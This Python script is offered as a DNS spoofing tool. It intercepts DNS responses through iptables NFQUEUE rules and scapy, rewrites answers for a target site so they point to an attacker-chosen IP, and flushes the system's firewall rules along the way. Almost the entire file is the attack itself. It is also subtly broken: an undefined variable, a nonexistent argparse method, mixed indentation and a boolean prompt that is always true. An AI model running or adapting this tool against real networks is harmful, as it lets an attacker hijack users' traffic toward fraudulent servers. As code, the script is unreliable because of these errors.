# !/usr/bin/env python

import os
import sys
import argparse
import subprocess
import netfilterqueue
import scapy.all as scapy

def get_machine():
    return bool(input("Do you want to run this program on local machine(true/false): "))

def get_site():
    return str(input("site: "))

def get_ip():
    return str(input("Enter the IP address of site you want to serve: "))

def get_arguments():
    p = argparse.ArgumentParser()
    p.add_arguments('-l','--local', dest='local', help='Whether you want to run this on your local machine or not')
    p.add_argument("-s", "-site", dest="Site", help="enter the site that you need to make spoof into")
    p.add_argument('-i','--ip', dest='ip', help='what do you want to serve instead of site(in IP address)')
    p.add_arguments('-qn','--queue-num', dest='queue_num', help='Queue number in IP tables that you want to capture the packtes into', default=0)
    options = p.parse_args()
    if not options.Site:
        options.Site = get_site()
    if not options.local:
		options.local = get_machine()
    if not options.ip:
        options.ip = get_ip()
    return options

arguments = get_arguments()

def modify_packet(packet):
    s_packet = scapy.IP(packet.get_payload()) #the packet in queue is converted into a scapy packet
    # if searching for DNS request use scapy.DNSRQ and if searching for response use scapy.DNSRR
    if sp.haslayer(scapy.DNSRR):
        qname = sp[scapy.DNSQR].qname #this is the request site that the user trying to get access to or searching for it
        if arguments.Site in qname: # we search for a particular site in the query then spoof the user
            print("[+] Spoofing target")
            #this reponse_packet is the modified one that we are going to send to the user
            sp[scapy.DNS].an = scapy.DNSRR(rrname=qname, rdata=arguments.ip) # this rdata is the IP address of the server that you want the user to redirect to ...
            sp[scapy.DNS].ancount = 1
            del sp[scapy.IP].len
            del sp[scapy.IP].chksum
            del sp[scapy.UDP].len
            del sp[scapy.UDP].chksum
            # since these values and parameters are needed to send a packet, scapy automatically calaulated thse values based on the given infomration inside this packet
            packet.set_payload(str(sp))
    packet.accept()  #this sends all the packets that are trapped in the queue to the router
    # packet.drop()  #this stops all the packets from reaching the router

try:
    if sys.platform == 'win32' or sys.platform == 'cygwin':
		print("[+] Y R U STILL USING WINDOWS FOR THIS WORK [-]")
		print("[-] Quitting the program")
		sys.exit()
	elif sys.platform == 'linux':
		os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
	# run the iptables commad as per user input (local or victim machine)
	# these commands to to clear all the previous iptables that are created and left in case
	subprocess.call(['iptables','--flush'])
	subprocess.call(['iptables','--table', 'nat', '--flush'])
	subprocess.call(['iptables','--delete-chain'])
	subprocess.call(['iptables','--table','nat','--delete-chain'])
	# check for the system to run the commands aganist
	if arguments.local:
		subprocess.call(['iptables','-I','INPUT','-j','NFQUEUE', '--queue-num', arguments.queue_num])
		subprocess.call(['iptables','-I','OUTPUT','-j','NFQUEUE', '--queue-num', arguments.queue_num])
	else:
		subprocess.call(['iptables','-P','FORWARD','ACCEPT'])
		subprocess.call(['iptables','-I','FORWARD','-j','NFQUEUE', '--queue-num', arguments.queue_num])
    queue0 = netfilterqueue.NetfilterQueue()
    queue0.bind(arguments.queue_num, modify_packet)
    print("\t\t\t[=] Made with code by DUMMY-the-BOT -- (use carefully)... <PEACE> [=]\n")
	print("[+] Starting DNS Spoofing program..")
    queue0.run()

except KeyboardInterrupt:
    print("[-] Detected Keyboard interrupt...quitting the program")
    print("[-] Deleting all the iptables that are created")
    #usage of os module to execute the terminal commands
    os.system('iptables --flush')
    os.system('iptables --table nat --flush')
    os.system('iptables --delete-chain')
    os.system('iptables --table nat --delete-chain')
    print("[-] Deleted the iptables created.")